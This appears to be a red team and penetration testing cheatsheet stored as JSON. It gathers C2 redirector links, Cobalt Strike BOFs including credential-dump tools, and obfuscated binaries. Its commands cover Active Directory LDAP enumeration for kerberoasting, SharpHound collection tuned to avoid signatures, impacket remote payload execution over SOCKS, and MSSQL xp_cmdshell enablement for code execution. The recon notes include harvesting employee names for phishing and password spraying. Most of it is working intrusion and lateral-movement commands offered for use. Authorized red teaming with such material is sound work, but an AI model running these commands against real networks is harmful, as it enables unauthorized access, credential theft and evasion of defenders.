{
  "id": 172,
  "header": "RedTeam-PenTest-Cheatsheet-Checklist",
  "topicList": [
    "C2 Redirectors",
    "Must-Have BOFs:",
    "Roxana Kovaci's Obfucated BINs:",
    "Execute-Assembly through BOF:",
    "External Recon Checklist (Essentials)",
    "Initial Access Recon",
    "Lateral Movement",
    "Nmap",
    "Misc"
  ],
  "itemGroups": [
    {
      "topic": "C2 Redirectors",
      "items": [
        {
          "title": "<a href=\"https://bigb0ss.medium.com/redteam-c2-redirector-cloud-fronting-setup-aws-e7ed561a3a6c\">bigb0ss's C2 Redirector — Cloud Fronting Setup (AWS)</a>"
        },
        {
          "title": "<a href=\"https://bigb0ss.medium.com/redteam-c2-redirector-domain-fronting-setup-azure-adbedbd28305\">bigb0ss's C2 Redirector — Domain Fronting Setup (Azure)</a>"
        }
      ]
    },
    {
      "topic": "Must-Have BOFs:",
      "items": [
        {
          "title": "<a href=\"https://github.com/trustedsec/CS-Situational-Awareness-BOF\">TrustedSec's Situational Awareness BOFs</a>"
        },
        {
          "title": "<a href=\"https://github.com/trustedsec/CS-Remote-OPs-BOF\">TrustedSec's Remote Operations BOFs</a>"
        },
        {
          "title": "<a href=\"https://github.com/ajpc500/BOFs\">ajpc500's BOFs</a>"
        },
        {
          "title": "<a href=\"https://github.com/rsmudge/unhook-bof\">Raphael Mudge's Unhook BOF</a>"
        },
        {
          "title": "<a href=\"https://github.com/EncodeGroup/BOF-RegSave\">EncodeGroup's SAM - SYSTEM - SECURITY Dump BOF</a>"
        },
        {
          "title": "<a href=\"https://github.com/rookuu/BOFs/\">rookuu's MiniDumpWriteDump BOF</a>"
        }
      ]
    },
    {
      "topic": "Roxana Kovaci's Obfucated BINs:",
      "items": [
        {
          "title": "<a href=\"https://github.com/RoxanaKovaci/Azure-pipelines/\">Obfucated BINs using Azure Pipelines</a>"
        },
        {
          "title": "<code>wget https://github.com/RoxanaKovaci/Azure-pipelines/releases/download/Obfuscated/Obfuscated.zip &amp;&amp; unzip -o Obfuscated.zip &amp;&amp; cat correlation.txt</code>"
        }
      ]
    },
    {
      "topic": "Execute-Assembly through BOF:",
      "items": [
        {
          "title": "<p>All assemblies should be run through <a href=\"https://github.com/CCob/BOF.NET\">BOF.NET</a>. </p><p>In Beacon terminal:</p><ol>\n<li><code>bofnet_init</code>"
        },
        {
          "title": "<code>bofent_load /Path/To/Assembly.exe</code>"
        },
        {
          "title": "<code>bofnet_executeassembly ASSEMBLYNAME -arg1 VALUE -arg2 VALUE</code></li>\n</ol>"
        }
      ]
    },
    {
      "topic": "External Recon Checklist (Essentials)",
      "items": [
        {
          "title": "<ol>\n<li>OSINT <em>(Passive)</em>"
        },
        {
          "title": "Whois company, what do they do or specialize in"
        },
        {
          "title": "Find out what the company atmosphere is like <em>(use company review sites like <a href=\"https://www.glassdoor.com/\">Glassdoor</a>)</em>"
        },
        {
          "title": "ASN Lookups"
        },
        {
          "title": "DNS Recon <em>(<a href=\"https://github.com/OWASP/Amass\">amass</a>, <a href=\"https://github.com/projectdiscovery/subfinder\">subfinder</a>, <a href=\"https://crt.sh\">crt.sh</a>,<a href=\"https://certspotter.com\">certspotter</a> DNS Zone transfers, etc)</em>, including MX/SPF etc"
        },
        {
          "title": "<a href=\"https://www.shodan.io/\">Shodan</a>"
        },
        {
          "title": "Company email format <em>(first.last, flast, etc -&gt; find on <a href=\"https://hunter.io/\">hunter.io</a>)</em>"
        },
        {
          "title": "Code repository recon <em>(github, gitlab, bitbucket, etc)</em> using <a href=\"https://github.com/trufflesecurity/truffleHog\">truffleHog</a>, <a href=\"https://github.com/awslabs/git-secrets\">git-secrets</a>, etc"
        },
        {
          "title": "Perform AWS bucket and/or Azure blob enumeration using tools such as <a href=\"https://github.com/NetSPI/MicroBurst\">MicroBurst</a> and <a href=\"https://github.com/brianwarehime/inSp3ctor\">inSp3ctor</a>."
        },
        {
          "title": "Harvest employee names <em>(use <a href=\"https://github.com/laramies/theHarvester\">theHarvester</a> and/or <a href=\"https://github.com/mez-0/linky\">Linky</a> with keyword searches)</em> and curate list with company email format"
        },
        {
          "title": "<em>(Used for phishing and/or password spraying)</em></li>\n</ul>\n</li>\n</ul>"
        },
        {
          "title": "<em>(Active)</em>"
        },
        {
          "title": "Nmap IPs/Domains for list of systems online and any open ports"
        },
        {
          "title": "Take note of any management ports externally accessible"
        },
        {
          "title": "Identify any web apps <em>(<a href=\"https://github.com/FortyNorthSecurity/EyeWitness\">Eyewitness</a>/<a href=\"https://github.com/michenriksen/aquatone\">Aquatone</a>)</em>"
        },
        {
          "title": "<em>(Especially employee login portals to perform a password spray)</em></li>\n</ul>"
        },
        {
          "title": "Inspect web apps for comments or files hosted in amazon, azure, etc."
        },
        {
          "title": "Perform discovery of documents across live domains to extract MetaData from <em>(<a href=\"https://github.com/m8r0wn/pymeta\">PyMeta</a>, <a href=\"https://github.com/dafthack/PowerMeta\">PowerMeta</a>, or <a href=\"https://github.com/ElevenPaths/FOCA\">FOCA</a>)</em>\n</li>\n</ol>"
        }
      ]
    },
    {
      "topic": "Initial Access Recon",
      "items": [
        {
          "topic": "LDAP Queries with ldapsearch Cobalt Strike BOF",
          "items": [
            {
              "title": "<hr/><p>Get Domain Controllers</p><p><code>ldapsearch \"(&amp;(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))\"</code></p><p>Get all Domain Admins</p><p><code>ldapsearch \"(&amp;(objectCategory=group)(name=Domain Admins))\"</code></p><p>Get Password Policy</p><p><code>ldapsearch \"(&amp;(objectClass=msDS-PasswordSettings))\"</code></p><p>Get specific User</p><p><code>ldapsearch \"(&amp;(objectCategory=person)(objectClass=user)(samaccountname=TARGETUSERNAME))\"</code></p><p>Get specific Computer</p><p><code>ldapsearch \"(&amp;(objectCategory=Computer)(name=TARGETCOMPUTERNAME))\"</code></p><p>Get all Groups</p><p><code>ldapsearch \"(&amp;(objectClass=group))\"</code></p><p>Get all active <em>(not disabled)</em> Users</p><p><code>ldapsearch \"(&amp;(objectCategory=person)(objectClass=user)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\"</code></p><p>Get all active <em>(not disabled)</em> Computers</p><p><code>ldapsearch \"(&amp;(objectCategory=Computer)(!userAccountControl:1.2.840.113556.1.4.803:=2))\"</code></p><p>Get <em>(not disabled)</em> accounts with SPN set for kerberoasting</p><p><code>ldapsearch \"(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\"</code></p><p>Get <em>(not disabled)</em> accounts that do not require PREAUTH for asreproasting</p><p><code>ldapsearch \"(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\"</code></p><p>Get Windows Servers</p><p><code>ldapsearch \"(&amp;(&amp;(&amp;(&amp;(samAccountType=805306369)(!(primaryGroupId=516)))(objectCategory=computer)(operatingSystem=Windows Server*))))\"</code></p><p>Get Users with <code>passnotreq</code> set</p><p><code>ldapsearch \"(&amp;(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=32))\"</code></p><p>All users with <code>Password Never Expires</code> set</p><p><code>ldapsearch \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))\"</code></p><p>Others:</p><p><em>https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx</em></p>"
            }
          ]
        },
        {
          "topic": "Use bofhound to generate bloodhound json data",
          "items": [
            {
              "title": "<p>First, run the above <a href=\"#ldap-queries-with-ldapsearch-cobalt-strike-bof\">ldap queries</a> (<em>as necessary</em>) and THEN the following <code>ldapsearch</code>'s:</p><p><code>ldapsearch \"(objectClass=domain)\" DC=TARGET,DC=DOMAIN</code></p><p><code>ldapsearch \"(schemaIDGUID=*)\" name,schemaidguid -1 \"\" CN=Schema,CN=Configuration,DC=TARGET,DC=DOMAIN</code></p><p><code>ldapsearch (name=ms-mcs-admpwd) name,schemaidguid 1 \"\" CN=Schema,CN=Configuration,DC=TARGET,DC=DOMAIN</code></p><p>Run <a href=\"https://github.com/fortalice/bofhound\">bofhound</a> on the Cobalt Strike logs to create the json data.</p>"
            }
          ]
        },
        {
          "topic": "Localhost Enumeration Examples with Seatbelt.exe",
          "items": [
            {
              "title": "<hr/><p><code>bofnet_load /path/to/Seatbelt.exe</code></p><p><code>bofnet_executeassembly Seatbelt -group=user</code></p><p><code>bofnet_executeassembly Seatbelt -group=system</code></p><p><code>bofnet_executeassembly Seatbelt -group=all -full</code></p>"
            }
          ]
        },
        {
          "topic": "Sharphound Collection Methods for BloodHound",
          "items": [
            {
              "title": "<hr/><p>WARNING: Sharphound's queries are heavily signatured (<em>even through proxy</em>), run at your own risk. Try <a href=\"#use-bofhound-to-generate-bloodhound-json-data\">bofhound first</a>.</p><p><code>bofnet_load /path/to/sharphound.exe</code></p><p>Run the following methods one at a time, mix up the order as desired:</p><p><code>bofnet_executeassembly Sharphound --CollectionMethods Group --Domain TARGETDOMAIN --Memcache --RandomFilenames</code></p><p><code>bofnet_executeassembly Sharphound --CollectionMethods Trusts --Domain TARGETDOMAIN --Memcache --RandomFilenames</code></p><p><code>bofnet_executeassembly Sharphound --CollectionMethods ACL --Domain TARGETDOMAIN --Memcache --RandomFilenames</code></p><p><code>bofnet_executeassembly Sharphound --CollectionMethods ObjectProps --Domain TARGETDOMAIN --Memcache --RandomFilenames</code></p><p><code>bofnet_executeassembly Sharphound --CollectionMethods Container --Domain TARGETDOMAIN --Memcache --RandomFilenames</code></p><p><code>bofnet_executeassembly Sharphound --CollectionMethods GPOLocalGroup --Domain TARGETDOMAIN --Memcache --RandomFilenames</code></p><p>If stuck and need to do Session and Localadmin collection, target specific systems of interest:</p><p><code>bofnet_executeassembly Sharphound --CollectionMethods Session,LocalAdmin --Domain TARGETDOMAIN --ComputerFile c:\\path\\to\\target\\systems.list --Jitter 20 --Throttle 2000 --Memcache --RandomFilenames</code></p>"
            }
          ]
        },
        {
          "topic": "Windows Share Enumeration",
          "items": [
            {
              "title": "<hr/><p>Hunt for sensitive files, scripts, and plaintext credentials in accessible shares. Speed it up (<em>can be loud</em>) by using this amazing tool: <a href=\"https://github.com/SnaffCon/Snaffler\">Snaffler</a> by <a href=\"https://github.com/l0ss\">l0ss</a>. </p>"
            }
          ]
        }
      ]
    },
    {
      "topic": "Lateral Movement",
      "items": [
        {
          "topic": "Impacket over SOCKS through Proxychains",
          "items": [
            {
              "title": "<hr/><p>Start SOCKS5 in a Cobaltstrike Beacon, add it into your local <code>/etc/proxychains4.conf</code> file</p><p>Get a TGT (using hash or plaintext)\n - <code>proxychains4 impacket-getTGT 'DOMAIN.COM/username:p@SsW0rD!'</code></p><p>Upload payload to targethost\n - <code>proxychains4 impacket-smbclient 'DOMAIN.COM/username:'@targethostname.domain.com -no-pass -k</code></p><p>Execute payload. Example of a few notable methods:</p><p><code>impacket-wmiexec</code>\n - <code>proxychains4 impacket-wmiexec -nooutput -silentcommand -no-pass -k 'DOMAIN.COM/username:'@targethostname.domain.com 'C:\\Windows\\System32\\cmd.exe /c C:\\Path\\To\\Payload\\maybe.exe'</code></p><p><code>impacket-dcomexec</code>\n - <code>proxychains4 impacket-dcomexec -object MMC20 -nooutput -silentcommand -no-pass -k 'DOMAIN.COM/username:'@targethostname.domain.com 'C:\\Windows\\System32\\cmd.exe /c C:\\Path\\To\\Payload\\maybe.exe'</code></p><p><code>impacket-services</code>\n - <code>proxychains4 impacket-services 'DOMAIN.COM/username:'@targethostname.domain.com config -name ServiceName</code>\n   - <em>Note down current config to change it back later</em>\n - <code>proxychains4 impacket-services 'DOMAIN.COM/username:'@targethostname.domain.com change -name ServiceName -path 'C:\\windows\\system32\\cmd.exe /c C:\\Path\\To\\Payload\\maybe.exe'</code>\n - <code>proxychains4 impacket-services 'DOMAIN.COM/username:'@targethostname.domain.com start -name ServiceName</code>\n - <code>proxychains4 impacket-services 'DOMAIN.COM/username:'@targethostname.domain.com change -name ServiceName -path 'CHANGE BACK TO OLD CONFIG NOTED FROM EARLIER'</code></p>"
            }
          ]
        },
        {
          "topic": "MoveKit",
          "items": [
            {
              "title": "<hr/><p><a href=\"https://github.com/0xthirteen/MoveKit\">MoveKit</a> and the required two assemblies: <a href=\"https://github.com/0xthirteen/SharpRDP\">SharpRDP</a> + <a href=\"https://github.com/0xthirteen/SharpMove\">SharpMove</a>.</p><p>Use <code>WMI</code> or the Service binpath modifcation technique <em>(<a href=\"https://github.com/Mr-Un1k0d3r/SCShell\">SCShell</a> by <a href=\"https://twitter.com/MrUn1k0d3r\">Mr-Un1k0d3r</a>)</em></p>"
            }
          ]
        },
        {
          "topic": "MSSQL",
          "items": [
            {
              "title": "<hr/><p>Check if xp_cmdshell is enabled</p><p><code>SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';</code></p><p>Enable advanced options</p><p><code>EXEC('sp_configure ''show advanced options'', 1; reconfigure;');</code></p><p>Enable xp_cmdshell</p><p><code>EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;');</code></p><p>RCE</p><p><code>exec master.sys.xp_cmdshell 'whoami'</code></p>"
            }
          ]
        }
      ]
    },
    {
      "topic": "Nmap",
      "items": [
        {
          "title": "<p>HVT ports for some quick wins on discovered subnets <em>(mostly when on an internal network)</em>\n- Java RMI: <code>1090,1098,1099,4444,11099,47001,47002,10999</code>\n- WebLogic: <code>7001-7004, 8000-8003,9000-9003,9503,7070,7071</code>\n- JDWP: <code>45000,45001</code>\n- JMX: <code>8686,9012,50500</code>\n- GlassFish: <code>4848</code> \n- jBoss: <code>11111,4444,4445</code> \n- Cisco Smart Install: <code>4786</code> \n- HP Data Protector: <code>5555,5556</code>\n- Apache Solr: <code>8983,8984</code></p>"
        }
      ]
    },
    {
      "topic": "Misc",
      "items": [
        {
          "topic": "Backup with Rsync",
          "items": [
            {
              "title": "<hr/><p>Backup CobaltStrike Logs</p><p><code>rsync -avzh -e \"ssh -i /path/to/private.ky\" root@TEAMSERVER:/path/to/cobaltstrike/logs/ /path/to/local/destination/folder</code></p><p>OR using your default <code>$HOME/.ssh/id_rsa</code></p><p><code>rsync -avzh -e \"ssh\" root@TEAMSERVER:/path/to/cobaltstrike/logs/ /path/to/local/destination/folder</code></p>"
            }
          ]
        },
        {
          "topic": "SSH Tunnels",
          "items": [
            {
              "title": "<hr/>"
            }
          ]
        }
      ]
    }
  ]
}